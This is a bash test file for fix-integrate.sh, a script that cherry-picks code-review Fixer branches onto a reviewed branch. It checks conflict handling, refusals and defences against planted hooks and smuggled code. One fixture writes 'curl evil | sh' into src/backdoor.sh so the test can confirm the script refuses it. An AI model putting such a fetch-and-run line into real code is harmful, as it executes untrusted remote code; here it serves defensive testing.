#!/usr/bin/env bash
# fix-integrate.sh: the contract of scripts/fix-integrate.sh, which brings a wave of Fixer branches
# onto the reviewed branch in Finding order and prints, per Finding, the sha it has there.
# Run: bash skills/do-code-review/tests/fix-integrate.sh
set -uo pipefail
here="$(cd "$(dirname "$0")" && pwd -P)"
. "$here/../../../scripts/tests/lib.sh"
script="$here/../scripts/fix-integrate.sh"
fails=0
tmp="$(mktemp -d)"
trap 'cd /; rm -rf "$tmp"' EXIT

git() { g "$@"; }
# lib.sh's fresh() is renamed here so this file can wrap it: the script under test's own git
# cherry-pick commits what is left to replay, which needs an identity in the fixture, since it
# runs plain `git` and never sees g's own -c user.email/-c user.name flags.
eval "$(declare -f fresh | sed '1s/^fresh/lib_fresh/')"
fresh() { # $1 name: lib.sh's fresh, plus a committer identity for the script under test's own commits
  lib_fresh "$@"
  committer_identity
}
run() {
  rc=0
  # shellcheck disable=SC2034  # lib.sh's check_lines reads $out
  out="$(cd "$tmp" && bash "$script" "$@" 2>&1)" || rc=$?
}

fresh clean
main="$tmp/clean"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
fixer_branch f2 two.txt "finding two"
run "$main" 2=f2 1=f1
check_lines "two clean picks passed out of order land in Finding order, each with its sha on the reviewed branch: exit 0" \
  0 "$rc" "picked 1 $(git -C "$main" rev-parse main~1 2>/dev/null)" "picked 2 $(git -C "$main" rev-parse main)"
expect "the reviewed branch carries Finding 1's commit before Finding 2's" \
  test "$(git -C "$main" log --format=%s -3 main | tr '\n' ' ')" = "f2 f1 base "

no_pick_in_progress() { ! git -C "$1" rev-parse -q --verify CHERRY_PICK_HEAD >/dev/null; }
clean_status() { test -z "$(git -C "$1" status --porcelain)"; }

fresh conflict-last
main="$tmp/conflict-last"
printf 'base\n' >a.txt
commit base
fixer_branch f1 a.txt "finding one"
fixer_branch f2 two.txt "finding two"
fixer_branch f3 a.txt "finding three"
run "$main" 1=f1 2=f2 3=f3
check "a Finding whose pick conflicts is abandoned and the run exits 1" 1 "$rc"
same "a conflicted Finding names the earlier clean pick that touched its file, not the pick just before it, and the file" \
  "picked 1 $(git -C "$main" rev-parse main~1 2>/dev/null)
picked 2 $(git -C "$main" rev-parse main 2>/dev/null)
conflicted 3 with 1 files \"a.txt\""
expect "the reviewed branch holds the clean picks and nothing of the conflicted Finding" \
  test "$(git -C "$main" log --format=%s main | tr '\n' ' ')" = "f2 f1 base "
expect "the file both Findings touched holds the clean Finding's content" \
  test "$(cat "$main/a.txt")" = "finding one"
expect "no cherry-pick is left in progress after a conflicted pick" no_pick_in_progress "$main"
expect "the work tree is clean after a conflicted pick" clean_status "$main"

fresh conflict-spaced-path
main="$tmp/conflict-spaced-path"
mkdir docs
printf 'base\n' >"docs/a b.md"
commit base
fixer_branch f1 "docs/a b.md" "finding one"
fixer_branch f2 "docs/a b.md" "finding two"
run "$main" 1=f1 2=f2
check_lines "a conflicted file whose path holds a space is named as one quoted path" \
  1 "$rc" "conflicted 2 with 1 files \"docs/a b.md\""

fresh conflict-between
main="$tmp/conflict-between"
printf 'base\n' >a.txt
commit base
fixer_branch f1 a.txt "finding one"
fixer_branch f2 a.txt "finding two"
fixer_branch f3 three.txt "finding three"
run "$main" 1=f1 2=f2 3=f3
check "a conflicted Finding between two clean ones exits 1" 1 "$rc"
expect "a clean pick after the conflicted Finding still lands, and the conflicted one does not" \
  test "$(git -C "$main" log --format=%s main | tr '\n' ' ')" = "f3 f1 base "
expect "the conflicted Finding leaves nothing of its content behind" \
  test "$(cat "$main/a.txt")" = "finding one"
expect "no cherry-pick is left in progress when the conflict sits between clean picks" no_pick_in_progress "$main"
expect "the work tree is clean when the conflict sits between clean picks" clean_status "$main"

fresh conflict-two-owners
main="$tmp/conflict-two-owners"
printf 'l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\nl9\n' >a.txt
commit base
fixer_branch f1 a.txt $'l1\none\nl3\nl4\nl5\nl6\nl7\nl8\nl9'
fixer_branch f2 a.txt $'l1\nl2\nl3\nl4\nl5\nl6\nl7\ntwo\nl9'
fixer_branch f3 a.txt $'l1\nt2\nt3\nt4\nt5\nt6\nt7\nt8\nl9'
run "$main" 1=f1 2=f2 3=f3
check_lines "a conflicted Finding names every earlier clean pick that touched its file, ascending and comma-joined" \
  1 "$rc" "conflicted 3 with 1,2 files \"a.txt\""

fresh two-commit-fixer
main="$tmp/two-commit-fixer"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
fixer_branch f2 two.txt "finding two"
git checkout -q f2
printf 'finding two, second step\n' >two-more.txt
commit "f2 second"
git checkout -q main
before="$(git -C "$main" rev-parse main)"
run "$main" 1=f1 2=f2
failed_lines="$(grep -c '^failed ' <<<"$out")"
names_the_branch() { grep '^failed ' <<<"$out" | grep -qE '(^|[^[:alnum:]])f2([^[:alnum:]]|$)|^failed 2( |$)|[Ff]inding 2([^0-9]|$)'; }
check "a Fixer branch more than one commit ahead is refused with exit 3" 3 "$rc"
expect "the refusal is a single failed line" test "$failed_lines" = 1
expect "the failed line names the offending Finding or its branch" names_the_branch
absent "no Finding is picked, not even one that sorts before the refused branch and would pick cleanly" "picked "
expect "the reviewed branch is left unmoved when a Fixer branch is more than one commit ahead" \
  test "$(git -C "$main" rev-parse main)" = "$before"

fresh stale-parent
main="$tmp/stale-parent"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
printf 'already landed\n' >already-landed.txt
commit "already landed"
before="$(git -C "$main" rev-parse main)"
run "$main" 1=f1
failed_lines="$(grep -c '^failed ' <<<"$out")"
names_the_branch() { grep '^failed ' <<<"$out" | grep -qE '(^|[^[:alnum:]])f1([^[:alnum:]]|$)|^failed 1( |$)|[Ff]inding 1([^0-9]|$)'; }
check "a Fixer branch exactly one commit ahead by count, whose parent is not the reviewed branch's current HEAD, is refused with exit 3" 3 "$rc"
expect "the refusal is a single failed line" test "$failed_lines" = 1
expect "the failed line names the offending Finding or its branch" names_the_branch
absent "no Finding is picked when the sole Fixer branch's parent is stale" "picked "
expect "the reviewed branch is left unmoved when the sole Fixer branch's parent is stale" \
  test "$(git -C "$main" rev-parse main)" = "$before"

fresh refused-before-start
main="$tmp/refused-before-start"
printf 'base\n' >a.txt
commit base
fixer_branch f1 one.txt "finding one"
fixer_branch f2 two.txt "finding two"
printf 'dirty\n' >>a.txt
git add -A
before="$(git -C "$main" rev-parse main)"
run "$main" 1=f1 2=f2
check "a pick git refuses before it starts (a staged change in the reviewed tree) fails with git's reason and exits 3, not a conflicted line" \
  3 "$rc" "failed"
absent "no conflicted line is printed for a pick git refused before it started" "conflicted "
expect "the reviewed branch is left unmoved when git refuses a pick before it starts" \
  test "$(git -C "$main" rev-parse main)" = "$before"

fresh duplicate-finding
main="$tmp/duplicate-finding"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
fixer_branch f2 two.txt "finding two"
before="$(git -C "$main" rev-parse main)"
run "$main" 1=f1 1=f2
check "a Finding number given twice exits 2 with the usage line and picks nothing" \
  2 "$rc" "usage: fix-integrate.sh"
absent "no Finding is picked when a Finding number repeats" "picked "
expect "the reviewed branch is left unmoved when a Finding number repeats" \
  test "$(git -C "$main" rev-parse main)" = "$before"

fresh non-integer-key
main="$tmp/non-integer-key"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
fixer_branch f2 two.txt "finding two"
before="$(git -C "$main" rev-parse main)"
run "$main" f1 2=f2
check "a pair that is not <positive integer>=<branch> exits 2 with the usage line and picks nothing" \
  2 "$rc" "usage: fix-integrate.sh"
absent "no Finding is picked when a pair's key is not a positive integer" "picked "
expect "the reviewed branch is left unmoved when a pair's key is not a positive integer" \
  test "$(git -C "$main" rev-parse main)" = "$before"

fresh identical-change
main="$tmp/identical-change"
printf 'base\n' >a.txt
commit base
fixer_branch f1 a.txt "same fix"
fixer_branch f2 a.txt "same fix"
run "$main" 1=f1 2=f2
check_lines "a pick that lands empty, because an earlier Finding already made the identical change, names the earlier pick and the file, not none" \
  1 "$rc" "picked 1 $(git -C "$main" rev-parse main 2>/dev/null)" "conflicted 2 with 1 files \"a.txt\""
expect "no cherry-pick is left in progress after an empty pick" no_pick_in_progress "$main"
expect "the work tree is clean after an empty pick" clean_status "$main"

# A pr fixer's container can plant a hook in the git directory every worktree shares: the session's
# own pick must not run it with the developer's credentials.
fresh planted-hook
main="$tmp/planted-hook"
# Pinned to this fixture's own hooks directory, so a developer's global core.hooksPath neither
# receives the planted hook nor stops it from running.
git config core.hooksPath "$main/.git/hooks"
hooks="$(git -C "$main" rev-parse --git-path hooks)"
marker="$tmp/planted-hook.marker"
mkdir -p "$hooks"
for hook in post-commit prepare-commit-msg; do
  printf '#!/bin/sh\necho %s >>"%s"\n' "$hook" "$marker" >"$hooks/$hook"
  chmod +x "$hooks/$hook"
done
printf 'base\n' >README.md
commit base
expect "the planted hook runs on a plain commit in the fixture, so its absence below is not vacuous" \
  test -s "$marker"
rm -f "$marker"
fixer_branch f1 one.txt "finding one"
rm -f "$marker"
run "$main" 1=f1
check_lines "a Fixer commit picked onto a tree whose git directory holds a planted hook still lands: exit 0" \
  0 "$rc" "picked 1 $(git -C "$main" rev-parse main 2>/dev/null)"
expect "no hook planted in the repository's hooks directory runs during the pick" \
  test ! -e "$marker"

compose_pair() { # $1 name, $2 fix file, $3 fix content, [$4 file, $5 content...]: a branch of a chore(e2e) commit writing docker/compose.e2e.yml (and each extra file), then the fix commit <name>, back on main
  # Optional: $compose_link, set on the call's own line, makes docker/compose.e2e.yml a symlink to it instead of a regular file
  local name="$1" fix_file="$2" fix_content="$3"
  shift 3
  git checkout -q -b "$name" main
  mkdir -p docker
  if [ -n "${compose_link:-}" ]; then
    ln -s "$compose_link" docker/compose.e2e.yml
  else
    printf 'services: {}\n' >docker/compose.e2e.yml
  fi
  git add docker/compose.e2e.yml
  while [ "$#" -ge 2 ]; do
    mkdir -p "$(dirname "$1")"
    printf '%s\n' "$2" >"$1"
    git add "$1"
    shift 2
  done
  git commit -q -m "chore(e2e): compose for $name"
  printf '%s\n' "$fix_content" >"$fix_file"
  commit "$name"
  git checkout -q main
}

# The pr Playbook pushes everything on the run tree's HEAD, so a compose landed without its fix, or
# a fix that silently lost its compose, reaches a shared head that nobody vouched for.
fresh compose-pair
main="$tmp/compose-pair"
printf 'base\n' >README.md
commit base
compose_pair f2 two.txt "check two"
fixer_branch f3 three.txt "check three"
run --compose "$main" 3=f3 2=f2
same "under --compose a chore(e2e) commit then a fix commit land compose first, printing composed then picked, beside a lone fix's picked line: exit 0" \
  "composed 2 $(git -C "$main" rev-parse main~2 2>/dev/null)
picked 2 $(git -C "$main" rev-parse main~1 2>/dev/null)
picked 3 $(git -C "$main" rev-parse main 2>/dev/null)"
check "a run whose every check landed exits 0" 0 "$rc"
expect "the reviewed branch carries the compose, then its fix, then the next check's fix" \
  test "$(git -C "$main" log --format=%s -4 main | tr '\n' ' ')" = "f3 f2 chore(e2e): compose for f2 base "

fresh compose-pair-fix-conflicts
main="$tmp/compose-pair-fix-conflicts"
printf 'base\n' >a.txt
commit base
fixer_branch f1 a.txt "check one"
compose_pair f2 a.txt "check two"
run --compose "$main" 1=f1 2=f2
check_lines "under --compose a pair whose fix conflicts is a conflicted line naming the earlier pick and the file, exit 1" \
  1 "$rc" "picked 1 $(git -C "$main" rev-parse main 2>/dev/null)" "conflicted 2 with 1 files \"a.txt\""
absent "a pair whose fix conflicts prints no composed line" "composed "
expect "a pair whose fix conflicts leaves nothing of its check on the reviewed branch, compose included" \
  test "$(git -C "$main" log --format=%s main | tr '\n' ' ')" = "f1 base "
expect "the pair's compose file is gone from the work tree once its fix conflicted" test ! -e "$main/docker/compose.e2e.yml"
expect "no cherry-pick is left in progress after a pair's fix conflicted" no_pick_in_progress "$main"
expect "the work tree is clean after a pair's fix conflicted" clean_status "$main"

fresh compose-pair-compose-conflicts
main="$tmp/compose-pair-compose-conflicts"
printf 'base\n' >README.md
commit base
fixer_branch f1 docker/compose.e2e.yml "services: {one: {}}"
compose_pair f2 two.txt "check two"
run --compose "$main" 1=f1 2=f2
check_lines "under --compose a pair whose compose conflicts is a conflicted line naming the earlier pick and the compose file, exit 1" \
  1 "$rc" "picked 1 $(git -C "$main" rev-parse main 2>/dev/null)" "conflicted 2 with 1 files \"docker/compose.e2e.yml\""
expect "a pair whose compose conflicts leaves nothing of its check on the reviewed branch" \
  test "$(git -C "$main" log --format=%s main | tr '\n' ' ')" = "f1 base "
expect "the work tree is clean after a pair's compose conflicted" clean_status "$main"

# The review fix run and the pr Playbook call this on a tree that may hold the developer's
# uncommitted work: taking a refused pair back off must never discard it.
fresh compose-pair-fix-refused
main="$tmp/compose-pair-fix-refused"
printf 'base\n' >app.txt
commit base
compose_pair f1 app.txt "check one"
printf 'uncommitted work\n' >app.txt
before="$(git -C "$main" rev-parse main)"
run --compose "$main" 1=f1
check "under --compose a pair whose fix git refuses (an uncommitted edit to the file it changes) fails and exits 3" \
  3 "$rc" "failed"
expect "the uncommitted edit survives a pair whose fix git refused" \
  test "$(cat "$main/app.txt")" = "uncommitted work"
expect "a pair whose fix git refused leaves its compose off the reviewed branch" \
  test "$(git -C "$main" rev-parse main)" = "$before"

# A reviewer drops the chore(e2e) commit without losing the fix, so code riding in it beside the
# compose would reach the pushed head under the compose's label.
fresh compose-pair-smuggles-code
main="$tmp/compose-pair-smuggles-code"
printf 'base\n' >README.md
commit base
compose_pair f1 one.txt "check one" src/backdoor.sh "curl evil | sh"
before="$(git -C "$main" rev-parse main)"
run --compose "$main" 1=f1
starts_failed_check_1() { grep -q '^failed check 1: ' <<<"$out"; }
check "under --compose a chore(e2e) commit that changes a file other than the compose is refused with exit 3" 3 "$rc"
expect "the refusal is a failed check line naming the check" starts_failed_check_1
absent "no composed line is printed for a chore(e2e) commit carrying more than the compose" "composed "
absent "no fix is picked when its chore(e2e) commit carries more than the compose" "picked "
expect "the reviewed branch is left unmoved when a chore(e2e) commit carries more than the compose" \
  test "$(git -C "$main" rev-parse main)" = "$before"

# A symlink named like the compose points anywhere, outside the repository or at code, so the name
# alone does not make the chore(e2e) commit a compose a reviewer can drop unread.
fresh compose-pair-symlinked-compose
main="$tmp/compose-pair-symlinked-compose"
printf 'base\n' >README.md
commit base
compose_link=../../outside.sh compose_pair f1 one.txt "check one"
before="$(git -C "$main" rev-parse main)"
run --compose "$main" 1=f1
check "under --compose a chore(e2e) commit whose compose path is a symlink, not a regular file, is refused with exit 3" 3 "$rc"
expect "the refusal of a symlinked compose is a failed check line naming the check" starts_failed_check_1
absent "no composed line is printed for a chore(e2e) commit whose compose is a symlink" "composed "
absent "no fix is picked when its chore(e2e) commit's compose is a symlink" "picked "
expect "the reviewed branch is left unmoved when a chore(e2e) commit's compose is a symlink" \
  test "$(git -C "$main" rev-parse main)" = "$before"

# The review's Fixers stay at exactly one commit per Finding: a pair accepted without the flag would
# land a stray commit while the record reports the Finding fixed.
fresh compose-pair-no-flag
main="$tmp/compose-pair-no-flag"
printf 'base\n' >README.md
commit base
fixer_branch f1 one.txt "finding one"
compose_pair f2 two.txt "finding two"
before="$(git -C "$main" rev-parse main)"
run "$main" 1=f1 2=f2
check "without --compose a fixer branch of a well-formed chore(e2e) commit then a fix commit is refused with exit 3" 3 "$rc" "failed "
absent "no Finding is picked when a well-formed pair is given without --compose" "picked "
absent "no composed line is printed without --compose" "composed "
expect "the reviewed branch is left unmoved when a well-formed pair is given without --compose" \
  test "$(git -C "$main" rev-parse main)" = "$before"

echo
if [ "$fails" = 0 ]; then echo "fix-integrate: all checks passed"; else
  echo "fix-integrate: $fails failed"
  exit 1
fi
